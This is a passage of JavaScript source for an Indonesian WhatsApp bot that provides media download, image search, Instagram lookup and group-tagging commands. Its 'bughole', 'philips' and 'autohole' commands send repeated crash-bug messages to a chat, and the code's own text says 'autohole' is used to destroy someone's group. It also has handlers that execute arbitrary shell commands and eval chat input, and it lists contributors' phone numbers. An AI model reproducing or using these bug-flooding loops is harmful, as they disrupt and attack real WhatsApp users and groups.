                let captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, foto, captionsYtmp4);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        limitAdd(sender, limit)
        break;   
      case 'emoji': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q) return fakegroup('emojinya?');
        qes = args.join(' ');
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        limitAdd(sender, limit)
        break;    
        
     case 'ytmp3': 
       if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`);
        let isLinks = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          yta(args[0]).then((res) => {
            let { dl_link, foto, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 30000)
                  return sendMediaURL(
                    from,
                    foto,
                    `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam rojaktuk link_`
                  );
                let captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, foto, captions);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break; 
        
      case 'image':
      case 'gimage':
      case 'googleimage': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (args.length < 1) return reply('Apa Yang Mau Dicari?');
        reply(mess.wait);
        teks = args.join(' ');
        res = await gis(teks, google);
        function google(error, result) {
          if (error) {
            return reply(
              '_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_'
            );
          } else {
            gugIm = result;
            random = gugIm[Math.floor(Math.random() * gugIm.length)].url;
            sendMediaURL(from, random);
          }
        }
        limitAdd(sender, limit)
        break;   

      case 'brainly': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (args.length < 1) return reply('Pertanyaan apa');
        brien = args.join(' ');
        brainly(`${brien}`).then((res) => {
          teks = '❉───────────────────────❉\n';
          for (let Y of res.data) {
            teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`;
          }
          arifi.sendMessage(from, teks, text, {
            quoted: rojak,
            detectLinks: false,
          });
        });
        limitAdd(sender, limit)
        break;   

      case 'igstalk': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q) return fakegroup('Usernamenya?');
        ig.fetchUser(`${args.join(' ')}`).then((Y) => {
          console.log(`${args.join(' ')}`);
          ten = `${Y.profile_pic_url_hd}`;
          teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ''
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Followers* : ${Y.followers}\n*Following* : ${
            Y.following
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join('')}`;
          sendMediaURL(from, ten, teks);
        });
        limitAdd(sender, limit)
        break;   
      case 'fb':
        if (!q) return reply('Linknya?');
        if (!isUrl(args[0]) && !args[0].includes('facebook.com'))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(' ');
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        limitAdd(sender, limit)
        break;   
      case 'term': 
      if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        if (!q) return fakegroup(mess.wrongFormat);
        exec(q, (err, stdout) => {
          if (err) return fakegroup(`SELF-BOT:~ ${err}`);
          if (stdout) {
            fakegroup(stdout);
          }
        });
        break;
      case 'join': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        try {
          if (!isUrl(args[0]) && !args[0].includes('whatsapp.com'))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return fakestatus('Masukan link group');
          var codeInvite = hen.split('https://chat.whatsapp.com/')[1];
          if (!codeInvite) return fakegroup('pastikan link sudah rojakar!');
          var response = await arifi.acceptInvite(codeInvite);
          fakestatus('SUKSES');
        } catch {
          fakegroup('LINK ERROR!');
        }
        break;
        
      case 'runtime':
      case 'test': {
        let runn = process.uptime();
        let teksss = `${kyun(runn)}`;
        fakegroup(teksss);
        }
        break;
        
      case 'speed':
      case 'ping':
        let timestamp = speed();
        let latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          let child = stdout.toString('utf-8');
          let ssd = child.replace(/Memory:/, 'Ram:');
          let pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
          fakegroup(pingnya);
        });
        break;
      case 'totag':
        if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          file = await arifi.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(' ');
          var group = await arifi.groupMetadata(from);
          var member = group['participants'];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: rojak,
          };
          ini_buffer = fs.readFileSync(file);
          arifi.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          file = await arifi.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(' ');
          var group = await arifi.groupMetadata(from);
          var member = group['participants'];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: rojak,
          };
          ini_buffer = fs.readFileSync(file);
          arifi.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          file = await arifi.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(' ');
          var group = await arifi.groupMetadata(from);
          var member = group['participants'];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'));
          });
          var options = {
            mimetype: 'audio/mp4',
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: rojak,
          };
          ini_buffer = fs.readFileSync(file);
          arifi.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          file = await arifi.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(' ');
          var group = await arifi.groupMetadata(from);
          var member = group['participants'];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'));
          });
          var options = {
            mimetype: 'video/mp4',
            contextInfo: { mentionedJid: mem },
            quoted: rojak,
          };
          ini_buffer = fs.readFileSync(file);
          arifi.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case 'tomp4': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          ger = isQuotedSticker
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          owgi = await arifi.downloadAndSaveMediaMessage(ger);
          webp2mp4File(owgi).then((res) => {
            sendMediaURL(from, res.result, 'Done');
          });
        } else {
          reply('reply stiker');
        }
        fs.unlinkSync(owgi);
        limitAdd(sender, limit)
        break;   
      case 'tourl': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (
          ((isMedia && !rojak.message.videoMessage) ||
            isQuotedImage ||
            isQuotedVideo) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedVideo
              ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                  .extendedTextMessage.contextInfo
              : rojak;
          owgi = await arifi.downloadMediaMessage(boij);
          res = await upload(owgi);
          reply(res);
        } else {
          reply('kirim/reply gambar/video');
        }
        break;
      case 'inspect':
        try {
          if (!isUrl(args[0]) && !args[0].includes('whatsapp.com'))
            return reply(mess.Iv);
          if (!q) return reply('masukan link wa');
          cos = args[0];
          var net = cos.split('https://chat.whatsapp.com/')[1];
          if (!net) return reply('pastikan itu link https://whatsapp.com/');
          jids = [];
          let {
            id,
            owner,
            subject,
            subjectOwner,
            desc,
            descId,
            participants,
            size,
            descOwner,
            descTime,
            creation,
          } = await arifi.query({
            json: ['query', 'invite', net],
            expect200: true,
          });
          let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${
  descOwner
    ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}`
    : '*Desc diubah oleh* : -'
}\n*Tanggal* : ${
            descTime ? `${formatDate(descTime * 1000)}` : '-'
          }\n\n*Kontak yang tersimpan*\n`;
          for (let y of participants) {
            par += `> @${y.id.split('@')[0]}\n*Admin* : ${
              y.isAdmin ? 'Ya' : 'Tidak'
            }\n`;
            jids.push(`${y.id.replace(/@c.us/g, '@s.whatsapp.net')}`);
          }
          jids.push(
            `${owner ? `${owner.replace(/@c.us/g, '@s.whatsapp.net')}` : '-'}`
          );
          jids.push(
            `${
              descOwner
                ? `${descOwner.replace(/@c.us/g, '@s.whatsapp.net')}`
                : '-'
            }`
          );
          arifi.sendMessage(from, par, text, {
            quoted: rojak,
            contextInfo: { mentionedJid: jids },
          });
        } catch {
          reply('Link error');
        }
        break; 

        case 'credits': {
			let sokl = '6281261324817@s.whatsapp.net'
			let sekl = '6285737134572@s.whatsapp.net'
			let salk = '6285866295942@s.whatsapp.net'
			let teh1b = '62895333381439@s.whatsapp.net'
			let teh2b = '6285773491566@s.whatsapp.net'
			let teh3b = '6285283427860@s.whatsapp.net'
			let fax = '6282334170916@s.whatsapp.net'
			let teh0b = '59172945992@s.whatsapp.net' //team from spanyol
			let yogay = '6283152753417@s.whatsapp.net'
teksits = `*DAFTAR PENGANTAR*

「 *Developer Of Bot* 」
•Arifi Razzaq @${sokl.split('@')[0]}
•Arya Manik @${sekl.split('@')[0]}
•Denis Putra @${salk.split('@')[0]}
•Angga @${teh3b.split('@')[0]}

「 *Combination of bot data* 」
•Arifi Razzaq @${sokl.split('@')[0]}
•Arya Manik @${sekl.split('@')[0]}
•Denis Putra @${salk.split('@')[0]}
•Dehante @${teh1b.split('@')[0]}
•Ridho-S @${teh2b.split('@')[0]}
•Angga @${teh3b.split('@')[0]}
•FG98 @${teh0b.split('@')[0]}
•FAX @${fax.split('@')[0]}
•YogiPW @${yogay.split('@')[0]}

❒ *SPECIAL BIG THANX TO :*
Mhankbarbar | Arugia | Adiwajhsing | xptn | tobz | Pengguna bot | Penyedia api key | Maslent | Nazwa | Arifi Razzaq | Agus | Caliph | Rey | Rizki | Aulia | Natasya | Drawl Nagl | Nayla | Khadijah | Aurel | Galuh | Ramlan | Anker | Dan Creator Bot Lainnya.

❒ *ENERGI CONTRIBUTOR :*
| Arifi Razzaq | Manik | Denis | FG98 | Dehante | Ridho-S | Angga | Aqulz | Rvan | Ivan-MLN | Guvan | Arya-DN | Rizky

❒ *DESIGN BASED :*
${tqto}

❒ *INSPIRE PLUGINS :*
Nurutomo
Ivanzz - MLN
Arifi Razzaq
Farhan
Galang
InfernoDmous

❒ *DOCUMENT FOR LET :*
Arifi Razzaq
Rafli
Usep
Hardianto
Manu
Alfa
Sanz
Ivanzz - MLN
Sarah
Naila
Rara
Wina Dcode
Denis
Dappa
Ryan
Nurutomo
InfernoDmous
Khadijah
Nylam`

arifi.sendMessage(
   from, 
   thumb, 
   image, { 
      quoted: rojak, 
      caption: teksits, 
      contextInfo: {
         mentionedJid: [
            sokl, 
            sekl, 
            salk, 
            teh1b, 
            teh2b, 
            teh3b, 
            teh0b, 
            fax, 
            yogay
], 
     forwardingScore: 1000, 
     isForwarded: true 
     }
  })
}
break;

      case 'eval': 
        if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        arifi.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(5)), null, '\t'),
          text,
          { quoted: rojak }
        );
        break;
//bug
case 'bughole': {
if (!rojak.key.fromMe) return reply(mess.me)
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
bugHole(from, 0)
arifi.relayWAMessage(global.mm=arifi.
prepareMessageFromContent(from, arifi.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0})
}
}
break;

case 'philips': {
if (!rojak.key.fromMe) return reply(mess.me)
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
Philips(from, 0)
}
}
break;

case 'autohole': {
if (!rojak.key.fromMe) return reply(mess.me)
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
sendBug(from, 0)
}
arifi.updatePresence(from, Presence.composing)
me = arifi.user
uptime = process.uptime()
ImageFakes = 'https://i.ibb.co/q19178v/IMG-20210410-142952.jpg'
bro = await getBuffer(ImageFakes)
var num = rojak.participant
async function autoplay(targett){
await arifi.sendMessage(`${server}`, `${global.get.anu.this.compossing}INFO : • ENG\n\nhello my developer, the use of bots has used the “autohole” feature to destroy someone‘s group.\n\n\nINFO : • IND\n\nHalo pengembang saya, penggunaan bot telah menggunakan fitur “autohole” untuk menghancurkan grup seseorang.${global.get.anu.this.compossing}\n\n\n────── 「 *${global.get.anu.packName}* 」 ──────\n── © 𝑐𝑟𝑒𝑎𝑡𝑒𝑑 𝐵𝑦 𝐴𝑟𝑖𝑓𝑖 𝑅𝑎𝑧𝑧𝑎𝑞 ──`, MessageType.extendedText, {sendEphemeral: true })
superhole(targett)
await sleep(3000)
sendBug(targett)
await sleep(4000)
superhole(targett)
await sleep(5000)
sendBug(targett)
await sleep(6000)
superhole(targett)
await sleep(7000)
reply(`${prefix}autohole ${args[0]}`)
console.log(iluminated.bold.yellow('[SYSTEM]'), iluminated.bold('Mengirim Bug Dalam Grup'), color(groupName))
}
autoplay(rojak.key.remoteJid)
}
break
        


          case 'lihatgambar2':
          kisoy = await getBuffer(`https://i.ibb.co/Kqfg0z3/Screenshot-2021-09-27-19-23-09-14.jpg`)
          arifi.sendMessage(from, kisoy, MessageType.image, {quoted: rojak})
          break

          case 'lihatgambar3':
          kisoy = await getBuffer(`https://i.ibb.co/Jncbf3m/Screenshot-2021-09-27-19-28-23-04.jpg`)
          arifi.sendMessage(from, kisoy, MessageType.image, {quoted: rojak})
          break

          case 'ywyw': 
          reply('OKE')
break;

      default:
        if (body.startsWith('>')) { 
        if (!isOwner && !rojak.key.fromMe) return arifi.reply(from, global.db.mess.owner, rojak)
          try {
            return arifi.sendMessage(
              from,
              JSON.stringify(eval(budy.slice(2)), null, '\t'),
              text,
              { quoted: rojak }
            );
          } catch (err) {
            e = String(err);
            reply(e);
          }
        }
        
        if (body.startsWith('$')) {
        if (!isOwner && !rojak.key.fromMe) return arifi.reply(from, global.db.mess.owner, rojak)
exec(q, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
   })
      }
        if (budy.includes('#button === help')) {
       koti = `Button Tidak Muncul Karena Anda Menggunakan WhatsApp Mod, Tapi Tidak Masalah Karena Kami Tahu Solusinya\n\n Caranya :
1. Buka GBWhatsApp Anda [Gambar Diatas]
2. Buka Tampilan Mod nya, terus ketik *layar percakapan* [#lihatgambar2]
3. lalu, matikan tombol *gambar peserta*  [#lihatgambar3]

selesai ^_^`
kisoy = await getBuffer(`https://i.ibb.co/mRb8Nsr/Screenshot-2021-09-27-19-07-14-75.jpg`)
sendButImage(from, koti, `${watermark}`, kisoy, [                      
          {
            buttonId: '#ywyw',
            buttonText: {
              displayText: `DONE`,
            },
            type: 1,
          },
        ]);         
};
			// AUTO
			for (let anji of setik) {
				if (budy === anji) {
					result = fs.readFileSync(`./media/sticker/${anji}.webp`)
					arifi.sendMessage(from, result, sticker, { quoted: rojak })
					}
			};
			for (let anju of vien) {
				if (budy === anju) {
					result = fs.readFileSync(`./media/vn/${anju}.mp3`)
					arifi.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 1, ptt: true, quoted: rojak })
					}
			};
			for (let anjh of imagi) {
				if (budy === anjh) {
					result = fs.readFileSync(`./media/image/${anjh}.jpg`)
					arifi.sendMessage(from, result, image, { quoted: rojak })
					}
			};
			if (isCmd && budy != undefined) {
			for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				};
		if (rojak.isBaileys) return
	    }
     }
  }
    } catch (e) {
      e = String(e);
if (
!e.includes(
  'c.isZero') && !e.includes(
  'this.isZero') && !e.includes(
  'startsWith') && !e.includes(
  'jid') && !e.includes(
  'Cannot convert undefined or null to object')
  ) 
  {
    let time_error = moment.tz('Asia/Jakarta').format('HH:mm:ss')
        console.log('Message : %s', bgcolor(time_error, 'blue'), color(e, 'red'));
        }
      }
  };